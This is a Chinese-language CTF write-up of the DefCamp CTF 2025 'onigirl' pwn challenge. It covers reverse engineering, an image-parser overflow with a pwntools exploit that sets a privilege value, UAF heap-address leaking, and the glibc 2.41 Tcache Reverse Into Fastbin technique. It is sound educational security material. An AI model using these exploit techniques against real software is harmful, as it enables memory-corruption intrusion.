# DefCamp CTF 2025 onigirl 复盘详解-先知社区

> **来源**: https://xz.aliyun.com/news/18992  
> **文章ID**: 18992

---

## 前言

唯一一个困难pwn题，难是真难，为期2天的比赛总共只有11只队伍解出，该题是glibc-2.41下的题目，总共3个难点：如何绕过图像校验？如何在受限情况下进行堆利用？受限情况下如何劫持执行流？对于前半，本文将介绍完整的深入分析复杂流程的过程，对于后半，本文将结合glibc2.41源码来介绍fastbin+tcachebin的组合利用技巧，和exit中攻击向量。

![image-20250921234546-vu86vbe.png](images/img_18992_000.png)

## 题目情况

题目来源：DefCamp CTF 2025（2025年9月14号），困难 pwn

保护全开，glibc-2.41 版本

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

## 逆向分析（前半）：privilege值生成

main函数很长，分段来看（这里是重命名后的结果）：

```
  v47 = __readfsqword(0x28u);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  setbuf(stdout, 0);
  random_seed = time(0);                        // 随机数
  srand(random_seed);
  privilege_value = 4;
  modification_parameters = modification_parameters_1;
  privilege_pointer = &privilege_value;
  printf("Enter image size in bytes: ");
  if ( !fgets(size_input_buffer, 32, stdin) )   // 输入size
  {
    fwrite("Failed to read size
", 1u, 0x14u, stderr);
    return 1;
  }
  input_size = strtoul(size_input_buffer, 0, 10);// 转换成数字
  if ( !input_size || input_size > 0x10000 )    // 不能是0，不能>0x10000
  {
    fprintf(stderr, "Bad size (1–%d)
", 0x10000);
    return 1;
  }
  allocated_buffer = malloc(input_size);        // 分配内存
  if ( !allocated_buffer )
  {
    perror("malloc");
    return 1;
  }
  bytes_read = read(0, allocated_buffer, input_size);
  if ( bytes_read <= 0 )
  {
    perror("read");
    free(allocated_buffer);
    return 1;
  }
  image_buffer = allocated_buffer;
  loaded_image_data = (char *)stbi_load_from_memory(
                                (__int64)allocated_buffer,
                                input_size,
                                (unsigned int *)&image_width,
                                (unsigned int *)&image_height,
                                (__int64 *)&p_menu_choice_storage,
                                3u,
                                modification_parameters_1);
  if ( loaded_image_data )
  {
    center_x = (double)image_width / 2.0;
    center_y = (double)image_height / 2.0;
    max_distance = hypot(center_x, center_y);
    random_modification_index = (int)((double)rand() / 2147483647.0 * 0.7 * 3.0 + 0.8);// 1
    *(double *)&modification_parameters[random_modification_index / 2 + 3] = (double)rand() / 2147483647.0 * 0.2 + 0.1;
    *(double *)&modification_parameters[3 * random_modification_index] = (double)rand() / 2147483647.0 * 0.25 + 0.15;
    for ( row_index = 0; row_index < image_height; ++row_index )
    {
      row_data_offset = &loaded_image_data[3 * row_index * image_width];
      if ( (row_index & 1) != 0 )
        row_color_value = 220;
      else
        row_color_value = 255;
      current_row_color = row_color_value;
      for ( i = 0; i < image_width; ++i )       
      {
        pixel_pointer = &row_data_offset[3 * i];
        distance_from_center = hypot((double)i - center_x, (double)row_index - center_y);
        normalized_distance = distance_from_center / max_distance;
        distance_factor = 1.8 * (1.0 - distance_from_center / max_distance);
        random_value = rand();
        *(double *)&modification_parameters[random_modification_index + 4] = 1.0
                                                                           - *(double *)&modification_parameters[random_modification_index + 1]
                                                                           * ((double)(unsigned __int8)random_value
                                                                            / 127.0);
        *(double *)&modification_parameters[random_modification_index + 1] = *(double *)&modification_parameters[random_modification_index + 5]
                                                                           * ((double)BYTE1(random_value)
                                                                            / 127.0)
                                                                           + 1.0;
        *(double *)&modification_parameters[2 * random_modification_index + 1] = 1.0
                                                                               - *(double *)&modification_parameters[2 * random_modification_index + 3]
                                                                               * ((double)BYTE2(random_value)
                                                                                / 127.0);
        if ( (random_value & 0x3FF) == 0 )      
        {
          *pixel_pointer ^= 0x3Fu;
          pixel_pointer[1] ^= 0x7Fu;
          pixel_pointer[2] = ~pixel_pointer[2];
        }
        red_component = pow((double)(unsigned __int8)*pixel_pointer / 255.0, (double)random_modification_index);
        processed_red = red_component * *(double *)&modification_parameters[random_modification_index + 4];
        green_component = pow((double)(unsigned __int8)pixel_pointer[1] / 255.0, (double)random_modification_index);
        processed_green = *(double *)&modification_parameters[random_modification_index + 5]
                        * ((distance_factor + 1.0)
                         * green_component);
        blue_component = pow((double)(unsigned __int8)pixel_pointer[2] / 255.0, (double)random_modification_index);
        processed_blue = blue_component * *(double *)&modification_parameters[random_modification_index + 4];
        clamped_red = fmin(processed_red, 1.0);
        *pixel_pointer = (int)(clamped_red * (double)current_row_color);
        clamped_green = fmin(processed_green, 1.0);
        pixel_pointer[1] = (int)(clamped_green * (double)current_row_color);
        clamped_blue = fmin(processed_blue, 1.0);
        pixel_pointer[2] = (int)(clamped_blue * (double)current_row_color);
        *privilege_pointer ^= (unsigned __int8)(pixel_pointer[1] & *pixel_pointer)
                            & (unsigned __int8)pixel_pointer[2]
                            & 0xF;
      }
    }
    *privilege_pointer |= 7u;
    *privilege_pointer &= 0x1FFFu;
    final_privilege_value = *privilege_pointer;
    *privilege_pointer = rand() & 0x3F | final_privilege_value;
    temporary_buffer_1 = malloc(0x2F0u);
    temporary_buffer_2 = malloc(0x8F0u);
    stbi_image_free(loaded_image_data);
    privilege = *privilege_pointer != 4919;
    menu_format_string = "yo face = %d
";
    printf("yo face = %d
", *privilege_pointer);
```

1. 读取用户输入的图像数据，**手动输入大小和内容，需要自己构造**
2. 加载图像并解析为 RGB 格式，这里通过`stbi_load_from_memory`函数进行，该函数是**静态编译进去的库函数**
3. 对图像进行一系列复杂的浮点数运算（问了AI知道是像素级的处理与变换，大致如下

* 基于像素点到图像中心的距离进行颜色调整。
* 引入随机扰动影响颜色计算。
* 应用幂函数和参数矩阵对 RGB 分量进行非线性变换。
* 某些像素进行 XOR 或 NOT 操作以引入噪声。

1. 在处理后生成一个“权限值”（`privilege`），后续进入一个交互式菜单系统，根据权限值（**需要是0才行**）决定用户可执行的操作（如分配、释放内存块等）。

## 利用分析&利用过程（前半）

### 分析如何得到 privilege == 0

让`privilege`的值为0的条件如下：

```
    privilege = *privilege_pointer != 4919;
```

需要`privilege_pointer`的值是4919，此处我测试了一个只有1个像素的bmp图片，将图片输入，这里解析出图片RGB三个hex值，经过一系列运算后，向privilege指针进行异或操作：

```
        *privilege_pointer ^= (unsigned __int8)(pixel_pointer[1] & *pixel_pointer)
                            & (unsigned __int8)pixel_pointer[2]
                            & 0xF;
```

这个操作进行一系列`&`运算，结果就是`privilege_pointer`的值和一个4位的值进行异或

然后紧接着的相关操作如下：

```
    *privilege_pointer |= 7u;
    *privilege_pointer &= 0x1FFFu;
    final_privilege_value = *privilege_pointer;
    *privilege_pointer = rand() & 0x3F | final_privilege_value;
    privilege = *privilege_pointer != 4919;
```

这里对`privilege_pointer`进行`|`运算，最后3为恒定设置为1，然后进行`& 0x1fff`，保留最后2字节，最后在`| rand() & 0x3f`设置最低一字节一个值

4919的十六进制：0x1337，最后的7是无论如何都会设置上的，问题在于中间的两个3，最后的那个3的值取决于`rand`函数的结果，也就是说，通过不断运行，就有概率得到0x37的最低字节值

问题在于如何在得到0x13的值？

这一块已经分析不出什么来了，**注意啊！这是pwn问题，就要通过pwn的方式来完成目标！！**

回过头来，看看这个`privilege_pointer`怎么来的：

```
  privilege_value = 4;
  modification_parameters = modification_parameters_1;
  privilege_pointer = &privilege_value;
```

他们的定义：

```
  __int64 modification_parameters_1[10]; // [rsp+D0h] [rbp-A0h] BYREF
  int privilege_value; // [rsp+120h] [rbp-50h] BYREF
  char size_input_buffer[40]; // [rsp+130h] [rbp-40h] BYREF
```

可见，`privilege_value`紧挨着`modification_parameters_1`数组，局部变量里就这么一个数组，碰巧有`privilege_value`紧挨着，是不是有可能，这个数组会发生溢出来影响`privilege_value`的值呢？

继续深入分析`modification_parameters_1`参数：

```
  modification_parameters = modification_parameters_1;
...
  loaded_image_data = (char *)stbi_load_from_memory(
                                (__int64)allocated_buffer,
                                input_size,
                                (unsigned int *)&image_width,
                                (unsigned int *)&image_height,
                                (__int64 *)&p_menu_choice_storage,
                                3u,
                                modification_parameters_1);
..。
```

然后是浮点运算用的了，正常使用逻辑下一般不会出现越界溢出，这里可疑的就是`stbi_load_from_memory`函数，进去追踪该参数：

```
__int64 __fastcall stbi_load_from_memory(
        __int64 buf,
        int size,
        unsigned int *p_j,
        unsigned int *p_i,
        __int64 *p_menu_choice_storage,
        unsigned int n3,
        __int64 *modification_parameters)
{
  __int64 v12[30]; // [rsp+30h] [rbp-F0h] BYREF

  v12[29] = __readfsqword(0x28u);
  stbi__start_mem(v12, buf, size);
  return stbi__load_and_postprocess_8bit((int)v12, p_j, p_i, p_menu_choice_storage, n3, modification_parameters);
}
```

继续进入`stbi__load_and_postprocess_8bit`：

```
char *__fastcall stbi__load_and_postprocess_8bit(
        unsigned int *a1,
        unsigned int *p_j,
        unsigned int *p_i,
        __int64 *p_menu_choice_storage,
        unsigned int n3,
        __int64 *modification_parameters)
{
  unsigned int n3_1; // eax
  bool v8; // al
  int n3_2; // eax
  char *main; // [rsp+40h] [rbp-20h]
  unsigned int p_n8[3]; // [rsp+4Ch] [rbp-14h] BYREF
  unsigned __int64 v15; // [rsp+58h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  main = stbi__load_main(a1, p_j, p_i, p_menu_choice_storage, n3, p_n8, 8, modification_parameters);
  if ( !main )
    return 0;
  if ( p_n8[0] != 8 && p_n8[0] != 16 )
    __assert_fail(
      "ri.bits_per_channel == 8 || ri.bits_per_channel == 16",
      "stb_image.h",
      0x50Cu,
      "stbi__load_and_postprocess_8bit");
  if ( p_n8[0] != 8 )
  {
    if ( n3 )
...
```

这里还要继续深入`stbi__load_main`：

```
char *__fastcall stbi__load_main(
        unsigned int *p_n4096,
        unsigned int *p_j,
        unsigned int *p_i,
        __int64 *p_menu_choice_storage,
        unsigned int n3,
        _DWORD *p_n8,
        int n8,
        __int64 *modification_parameters)
{
  unsigned int n3_1; // eax
  void *v14; // [rsp+38h] [rbp-8h]

  memset(p_n8, 0, 0xCu);
  *p_n8 = 8;
  p_n8[2] = 0;
  p_n8[1] = 0;
  if ( (unsigned int)stbi__png_test(p_n4096, modification_parameters) )
    return (char *)stbi__png_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);
  if ( (unsigned int)stbi__bmp_test(p_n4096, modification_parameters) )
    return stbi__bmp_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);
  if ( stbi__gif_test(p_n4096, modification_parameters) )
    return (char *)stbi__gif_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);
  if ( (unsigned int)stbi__psd_test(p_n4096, modification_parameters) )
    return stbi__psd_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, n8, modification_parameters);
  if ( (unsigned int)stbi__pic_test(p_n4096, modification_parameters) )
    return (char *)stbi__pic_load(
                     p_n4096,
                     p_j,
                     p_i,
                     (unsigned int *)p_menu_choice_storage,
                     n3,
                     p_n8,
                     modification_parameters);
  if ( (unsigned int)stbi__jpeg_test(p_n4096, modification_parameters) )
    return (char *)stbi__jpeg_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);
  if ( (unsigned int)stbi__pnm_test(p_n4096, modification_parameters) )
    return stbi__pnm_load((int *)p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);
  if ( (unsigned int)stbi__hdr_test(p_n4096, modification_parameters) )
  {
    v14 = stbi__hdr_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8, modification_parameters);
    if ( n3 )
      n3_1 = n3;
    else
      n3_1 = *(_DWORD *)p_menu_choice_storage;
    return (char *)stbi__hdr_to_ldr(v14, *p_j, *p_i, n3_1);
  }
  else if ( (unsigned int)stbi__tga_test(p_n4096, modification_parameters) )
  {
    return (char *)stbi__tga_load(p_n4096, p_j, p_i, p_menu_choice_storage, n3, p_n8);
  }
  else
  {
    stbi__err("unknown image type");
    return 0;
  }
}
```

这里可以看到，大量函数都用了`modification_parameters`参数，经过逐个探索，发现位于`stbi__pic_load`函数中存在溢出问题：

```
      if ( !stbi__pic_load_core(
              file_data_ptr,
              image_width,
              image_height,
              local_format_ptr,
              (char *)loaded_image_data,
              image_modifications_ptr) )
      {
        free(loaded_image_data);
        loaded_image_data = 0;
      }
      *image_width_ptr = image_width;
      *image_height_ptr = image_height;
      if ( !requested_components )
        requested_components = *local_format_ptr;
      loaded_image_data = (void *)stbi__convert_format(
                                    loaded_image_data,
                                    4,
                                    requested_components,
                                    image_width,
                                    image_height);
      for ( i = 0; i <= 10; ++i )
        *(double *)&image_modifications_ptr[i] = image_noises[i];
      return loaded_image_data;
```

这里先调用了`stbi__pic_load_core`函数，调用完之后，下面的for循环进行赋值，从`image_noises`中赋值，这里会赋值到`image_modifications_ptr`[10]中，刚好就是溢出覆盖到下一个成员的地方

能否在第2字节处赋值到0x13字节，就需要这里`image_noises[10]`的第二字节是0x13，继续深入，在经过一系列计算之后，在最后会出现如下运算，给`image_noises`数组进行赋值操作：

```
            if ( mod_result > 0 )
              index_temp = ((unsigned __int8)*buffer_ptr - (unsigned __int8)*(buffer_ptr - 4)) % 11;// 不求反的情况
            image_noises[index_temp] = noise_value + (double)(unsigned __int8)(buffer_ptr[1] ^ buffer_ptr[2]) * 1.0e-16;
            buffer_ptr += 4;                    // 累加操作
          }
```

到这里已经分析明白了如何给`privilege_value`赋值，接下来就是分析如何构造结构了，这些函数都是基于文件结构进行一系列计算和处理，我们需要给定正确的格式才能执行到这里完成溢出的目标

### 分析文件结构的构造

回到`stbi__load_main`：

```
  if ( (unsigned int)stbi__pic_test(p_n4096, modification_parameters) )
    return (char *)stbi__pic_load(
                     p_n4096,
                     p_j,
                     p_i,
                     (unsigned int *)p_menu_choice_storage,
                     n3,
                     p_n8,
                     modification_parameters);
```

我们要进入`stbi__pic_load`，需要先通过`stbi__pic_test`的校验：

```
__int64 __fastcall stbi__pic_test(unsigned int *p_n4096, __int64 *modification_parameters)
{
  unsigned int v3; // [rsp+1Ch] [rbp-4h]

  v3 = stbi__pic_test_core(p_n4096, modification_parameters);
  stbi__rewind(p_n4096);
  return v3;
}

_BOOL8 __fastcall stbi__pic_test_core(unsigned int *p_n4096, __int64 *modification_parameters)
{
  int i; // [rsp+1Ch] [rbp-4h]

  if ( !(unsigned int)stbi__pic_is4(p_n4096, &PICT) )// 4个字节头校验：53 80 f6 34 
    return 0;
  for ( i = 0; i <= 0x53; ++i )
    stbi__get8(p_n4096);
  return (unsigned int)stbi__pic_is4(p_n4096, "PICT") != 0;
}
```

很显然，这里是校验文件头的地方，需要最前面4字节是PICT，然后在0x53字节处也是PICT

然后在`stbi__pic_load`中解析结构的部分如下：

```
  local_format_ptr = image_format_ptr;
  stack_canary_value = __readfsqword(0x28u);
  if ( !image_format_ptr )
    local_format_ptr = (unsigned int *)&temp_format_storage;
  for ( header_skip_counter = 0; header_skip_counter <= 0x5B; ++header_skip_counter )
    stbi__get8((__int64 *)file_data_ptr);       // 跳过header 92字节
  image_width = stbi__get16be(file_data_ptr);   // 16bit大端序
  image_height = stbi__get16be(file_data_ptr);  // 16bit大端序
  if ( (int)image_height > 4096 || (int)image_width > 4096 )// 不能超过4096
    goto LABEL_12;
  if ( (unsigned int)stbi__at_eof(file_data_ptr) )
  {
    stbi__err("bad file");
    return 0;
  }
  if ( (unsigned int)stbi__mad3sizes_valid(image_width, image_height, 4, 0) )
  {
    stbi__get32be(file_data_ptr);               // 跳过8字节
    stbi__get16be(file_data_ptr);
    stbi__get16be(file_data_ptr);
    loaded_image_data = (void *)stbi__malloc_mad3(image_width, image_height, 4u, 0);// 分配内存
    if ( loaded_image_data )
    {
      memset(loaded_image_data, 0xFF, (int)(4 * image_height * image_width));
      if ( !stbi__pic_load_core(
              file_data_ptr,
              image_width,
              image_height,
              local_format_ptr,
              (char *)loaded_image_data,
              image_modifications_ptr) )
```

跳过0x5b字节，然后以16位大端序读取图像宽和图像长的值

这里需要在0x5c处构造width，0x5e处构造height，这两个数据不能超过4096，也就是0x1000，换成大端序就是0x0010

然后跳过8字节，进入`stbi__pic_load_core`，前半部分如下：

```
  *(_QWORD *)&buffer_ptr_1[4] = __readfsqword(0x28u);
  compression_flags = 0;
  header_index = 0;
  do
  {
    if ( header_index == 10 )
    {
LABEL_3:
      stbi__err("bad format");
      return 0;
    }
    temp_int = header_index++;
    header_ptr = &header_data[3 * temp_int];    // 3字节
    header_type = (unsigned __int8)stbi__get8((__int64)data_stream);// 类型，为0的时候跳出结构
    *header_ptr = stbi__get8((__int64)data_stream);// 需要是8，必须是8
    header_ptr[1] = stbi__get8((__int64)data_stream);
    header_ptr[2] = stbi__get8((__int64)data_stream);
    compression_flags |= header_ptr[2];
    if ( (unsigned int)stbi__at_eof(data_stream) )
    {
LABEL_54:
      stbi__err("bad file");
      return 0;
    }
    if ( *header_ptr != 8 )
      goto LABEL_3;
  }
  while ( header_type );
  if ( (compression_flags & 0x10) != 0 )
    channel_count = 4;
  else
    channel_count = 3;
  *channels_out = channel_count;                // 这个数据是返回的，后面处理不用，不用管
```

这里header\_data是局部变量，对结构的操作如下：

读取1个字节，作为类型，是0的话，就会直接跳出循环，降低运算的复杂性

读取3个字节，给header\_data数组

这个do-while循环以4字节一组进行读取数据作为header信息

然后后半段：

```
  for ( i = 0; i < row_index; ++i )
  {
    for ( channel_index = 0; channel_index < header_index; ++channel_index )// 1个通道头，就只执行一轮
    {
      channel_header_ptr = &header_data[3 * channel_index];
      buffer_ptr = &output_buffer[4 * width * i];
      if ( channel_header_ptr[1] == 2 )         // 通道头 = 2
      {
      
...  
        
      }
      else                                      // 1或者0的情况
      {
        if ( (unsigned __int8)header_data[3 * channel_index + 1] > 2u )// 只能是0 1 2
          goto LABEL_3;
        if ( header_data[3 * channel_index + 1] )// 1 的情况
        {
...
        }
        else                                    // 0的情况
        {
          for ( copy_count = 0; copy_count < width; ++copy_count )// 累加次数是width
          {
            if ( !stbi__readval(data_stream, (unsigned __int8)channel_header_ptr[2], buffer_ptr) )// 需要读取的值不为0，读取4字节到buffer_ptr
              return 0;
            mod_result = ((unsigned __int8)*buffer_ptr - (unsigned __int8)*(buffer_ptr - 4)) % 11;// 每次读取4字节，首字节相减求模11
            neg_mod_result = -mod_result;       // 求反
            if ( mod_result > 0 )               // 如果是大于0的值
              neg_mod_result = ((unsigned __int8)*buffer_ptr - (unsigned __int8)*(buffer_ptr - 4)) % 11;// 就不进行求反，值是0-10的值，1010
            noise_value = image_noises[neg_mod_result];// 原本的噪音
                                                // pwndbg> p $st0
                                                // $1 = 2
            index_temp = -mod_result;           // 索引是求反的值
                                                // 如果是-10，求反变成10，就能控制idx=10，溢出位所在
            if ( mod_result > 0 )
              index_temp = ((unsigned __int8)*buffer_ptr - (unsigned __int8)*(buffer_ptr - 4)) % 11;// 不求反的情况
            image_noises[index_temp] = noise_value + (double)(unsigned __int8)(buffer_ptr[1] ^ buffer_ptr[2]) * 1.0e-16;
            buffer_ptr += 4;                    // 累加操作
          }
        }
      }
    }
  }
  return output_buffer;
```

这里根据header\_data第一个字节判断是什么类型，我们需要进入的片段在最后为0的分支里

所以刚刚读取的第一个字节的值需要是0

然后这里，是个循环，循环次数取决于width，就是之前我们设置的width值

每一轮读取4个字节，首字节和上一轮的首字节相减求模11，第一轮的上一轮首字节是0，如果这个值是负数，就求反

根据模结果来决定image\_noises的索引，我们需要溢出，需要这个值是10

然后对于noise\_value，则是读取该索引处原本的值，然后对读取的4字节中的中间2字节进行异或，乘以一个浮点数，结果进行累加

为了让这个数值更快的加到0x13??，最好让异或的结果大一些，选择0xf0和0x0f进行组合

对于首字节，交替输入0和10即可，做差求模一定是10

综上，每2次循环为一组，则如此构造：

```
bytes([10,0xf0,0x0f,4]) + bytes([0,0xf0,0x0f,4])
```

因为乘法的常量1.0e-16是个很小的数字，所以需要累加很多很多次，循环次数取决于width，所以这里可无脑填充大量的该8字节组合数据，通过不断测试width的值观察程序输出结果来判断width应该是多少（最终`privilege_value`需要是0x1337，末尾的0x37是固定的，只需要找到一个合适的width让`privilege_value`第二个字节的值为0x13即可）

经过测试，width为0x55时，能够覆盖出目标值，最终需要构造的结构&payload发送

### exp（前半）：

```
def pack_data():
    return bytes([10,0xf0,0x0f,4]) + bytes([0,0xf0,0x0f,4])

data = flat({
    # header check
    0:bytes([0x53, 0x80, 0xF6, 0x34]),
    0x58:b"PICT",
    0x5c:p16(0x5500),   # width big endian
    0x5e:p16(0x100),   # height big endian
    0x68:bytes([0,8,0,0xf0]), # header info
    0x6c:pack_data()*0x40
},filler=b"\x00")

sz = len(data)
ru(b"Enter image size in bytes: ")
sl(str(sz).encode())
sl(data)

ru(b"yo face = ")
num = rl()[:-1]
success(f"num = {num} / 4919")
```

因为随机数的存在，需要多尝试几次，直到成功：

```
[DEBUG] Received 0x1b bytes:
    b'Enter image size in bytes: '
[DEBUG] Sent 0x4 bytes:
    b'620
'
[DEBUG] Sent 0x26d bytes:
    00000000  53 80 f6 34  00 00 00 00  00 00 00 00  00 00 00 00  │S··4│····│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  50 49 43 54  00 55 00 01  │····│····│PICT│·U··│
    00000060  00 00 00 00  00 00 00 00  00 08 00 f0  0a f0 0f 04  │····│····│····│····│
    00000070  00 f0 0f 04  0a f0 0f 04  00 f0 0f 04  0a f0 0f 04  │····│····│····│····│
    *
    00000260  00 f0 0f 04  0a f0 0f 04  00 f0 0f 04  0a           │····│····│····│·│
    0000026d
[DEBUG] Received 0x26 bytes:
    b'yo face = 4919
'
    b'=== restoaurnat ===
'
    b'>> '
[+] num = b'4919' / 4919
```

## 逆向分析（后半）：菜单堆管理

成功拿到privilege==0之后，下面的菜单选项变得可用：

```
    while ( 1 )
    {
      while ( 1 )
      {
        menu(menu_format_string);
        menu_format_string = "%d";
        if ( (unsigned int)__isoc99_scanf("%d", &choice) != 1 )
        {
          puts("Invalid input!");
          exit(1);
        }
        if ( choice != 31 )
          break;
        if ( privilege )
          goto LABEL_39;
        do_show();                              // 检查chunk指针，打印8字节
      }
      if ( choice > 31 )
        goto LABEL_42;
      if ( choice == 17 )
      {
        puts("Here's a dollar go get yoself a mggaga");
        goto LABEL_42;
      }
      if ( choice > 17 )
        goto LABEL_42;
      if ( choice == 1 )
      {
        if ( privilege )
          goto LABEL_39;
        do_alloc();                             // 申请，填充数据，只能申请2次
      }
      else if ( choice == 2 )
      {
        if ( privilege )
        {
LABEL_39:
          menu_format_string = "You have to be a pwn monk to order";
          puts("You have to be a pwn monk to order");
        }
        else
        {
          do_delete("%d");                      // 存在未清空的指针
        }
      }
      else
      {
LABEL_42:
        menu_format_string = "Invalid choice!";
        puts("Invalid choice!");
      }
    }
  }
  error_message = (const char *)stbi_failure_reason(image_buffer);
  printf("Error loading image: %s
", error_message);
  return 1;
```

do\_alloc：

这里申请内存长度取决于输入长度，范围是0到0x5f，最大申请出来0x70的chunk，tcache和fastbin范围内

会记录当前申请的size大小，可以无限申请该size，size只能变化1次，变化后就只能申请变化后的size

管理内存的数组一共11个，索引0-10可自由安排

```
unsigned __int64 __fastcall do_alloc()
{
  unsigned int idx; // [rsp+Ch] [rbp-84h] BYREF
  size_t size; // [rsp+10h] [rbp-80h]
  void *s; // [rsp+18h] [rbp-78h]
  _BYTE buf[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+88h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("order: ");
  if ( (unsigned int)__isoc99_scanf("%d", &idx) == 1 && idx <= 0xA )
  {
    printf("describe ");
    getchar();
    size = read(0, buf, 0x5Fu);                 // 长度取决于输入长度
    if ( (__int64)size > 0 )                    // 读取的长度
    {
      if ( buf[size - 1] == 10 )                // 最后一个是
，就忽略
        --size;
      if ( size && (__int64)size <= 0x5F )      // 长度<=0x5f
      {
        if ( size != sizes[allowed] )           // 数组，size不同就设置到数组里
          sizes[++allowed] = size;              // 从1开始
        if ( allowed <= 2 )                     // 前2个
        {
          s = malloc(size);                     // 申请内存
          if ( !s )
            exit(1);
          memset(s, 0, 8u);
          memcpy(s, buf, size);                 // 复制
          chunks[idx] = (__int64)s;             // 设置指针
          puts("big chungus.");
        }
        else
        {
          puts("You ate too much and pooped yoself");
        }
      }
    }
  }
  return v5 - __readfsqword(0x28u);
}
```

do\_delete：

释放chunk后没有清空指针，潜在UAF和Double-Free问题

```
unsigned __int64 __fastcall do_delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("throw? D: ");
  if ( (unsigned int)__isoc99_scanf("%d", &idx) == 1 && idx <= 0xA )
    free((void *)chunks[idx]);                  // UAF，Double-Free
  return v2 - __readfsqword(0x28u);
}
```

do\_show：

可以打印指定chunk 8 字节内容，配合UAF可以泄露释放chunk的前8字节指针

```
unsigned __int64 __fastcall do_show()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("food where: ");
  if ( (unsigned int)__isoc99_scanf("%d", &idx) == 1 && idx <= 0xA )// 输入 1~10
  {
    printf("burgir[%d]: ", idx);
    if ( chunks[idx] )                          // 指针存在，就打印8字节
      write(1, (const void *)chunks[idx], 8u);
  }
  return v2 - __readfsqword(0x28u);
}
```

### 辅助函数

```
def cmd(i, prompt=b">> "):
    sla(prompt, i)

def add(idx, data):
    cmd('1')
    sla(b"order: ", str(idx).encode())
    sla(b"describe ", data)
    #......

def dele(idx):
    cmd('2')
    sla(b"throw? D: ", str(idx).encode())
    #......

def show(idx):
    cmd('31')
    sla(b"food where: ", str(idx).encode())
    #......
```

## 利用分析&利用过程（后半）

整理当前情况：

1. glibc 版本 2.41：存在fastbin，tcachebin的指针加密，没有 hook 函数可用
2. 通过输入数据的长度来申请内存，申请内存只能申请一种大小，这个大小只能更变一次，范围是0-0x5f，意味着无法通过申请来泄露任何数据
3. 可以同时管理11个chunk
4. 存在UAF，可以泄露释放的chunk的前8字节内容

因为指针加密的存在，使用tcachebin chunk可以直接泄露出heap地址

```
add(0,b"A"*0x58)
dele(0)
show(0)
ru(b"burgir[0]: ")
heap_leak = r(8)
heap_leak = u64(heap_leak)
success(f"heap_leak = {hex(heap_leak)}")
heap_base = (heap_leak << 12 )- 0x1000
```

还需要想办法得到libc地址，**堆上出现libc地址且位于前8字节的情况只有一种：让堆上出现unsortedbin chunk**

那就得 free 一个unsortedbin size 的 chunk，就需要让一个可控的chunk的size字段被修改

完成这个目标就需要任意内存分配或者任意内存写，只能使用tcachebin和fastbin的场景下，有一种技巧叫做：Tcache Reverse Into Fastbin

### 源码分析：2.41 下的 Tcache Reverse Into Fastbin 技巧

Tcache Reverse Into Fastbin 技巧位于malloc流程中从fastbin申请chunk的部分：

```
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ())) /* fastbin 尺寸 */
    {
      idx = fastbin_index (nb); /* 计算对应 fastbin 索引 */
      mfastbinptr *fb = &fastbin (av, idx); /* 获取该 fastbin 的链表头指针 */
      mchunkptr pp;
      victim = *fb; /* 候选块：链表当前头 */

      if (victim != NULL) /* fastbin 非空：尝试取出 */
    {
      if (__glibc_unlikely (misaligned_chunk (victim)))
        malloc_printerr ("malloc(): unaligned fastbin chunk detected 2"); /* 保护性检查：头地址未按对齐 */

      if (SINGLE_THREAD_P)
        *fb = REVEAL_PTR (victim->fd); /* 单线程：解密指针得到fd地址 */
      else
        REMOVE_FB (fb, pp, victim); /* 多线程情况 */
      if (__glibc_likely (victim != NULL))
        {
          size_t victim_idx = fastbin_index (chunksize (victim));
          if (__builtin_expect (victim_idx != idx, 0))
        malloc_printerr ("malloc(): memory corruption (fast)"); /* 块大小与bin不匹配：内存损坏 */
          check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
          /* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */
          size_t tc_idx = csize2tidx (nb);	/* 获取tcache索引 */
          if (tcache != NULL && tc_idx < mp_.tcache_bins)	/* tcachebin 没填满就往下走 */
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count	/* 直到填满为止 */
             && (tc_victim = *fb) != NULL)
            {
              if (__glibc_unlikely (misaligned_chunk (tc_victim)))	/* 保护性检查：头地址对齐 */
            malloc_printerr ("malloc(): unaligned fastbin chunk detected 3");
              if (SINGLE_THREAD_P)
            *fb = REVEAL_PTR (tc_victim->fd); /*解密tcachebin chunk fd指针*/
              else
            {
              REMOVE_FB (fb, pp, tc_victim);
              if (__glibc_unlikely (tc_victim == NULL))
                break;
            }
              tcache_put (tc_victim, tc_idx);	/*放入 tcachebin */
            }
        }
#endif
          void *p = chunk2mem (victim); /* 从chunk头换算用户指针 */
          alloc_perturb (p, bytes); /* 可选扰动填充，帮助发现越界 */
          return p; /* fastbin 命中直接返回 */
        }
    }
    }
```

当相同size的tcachebin为空的时候，存在相同size的fastbin，申请的时候会进行如下操作：

1. 判断当前fastbin对应size的bin是否为空
2. 取出fastbin链表头指针得到victim，解密其fd指针得到下一个chunk，该victim chunk将用于最后的分配
3. 如果检查发现tcachebin没满，就将后续的所有chunk装入tcachebin中
4. 最后分配走 victim chunk

‍

例如：通过申请10个chunk，依次释放，7个chunk进入tcachebin，3个chunk进入fastbin；

此时申请走7个tcachebin chunk，再次申请的时候，满足了tcachebin没满，fastbin有多个chunk的条件，会进入Tcache Reverse Into Fastbin的流程

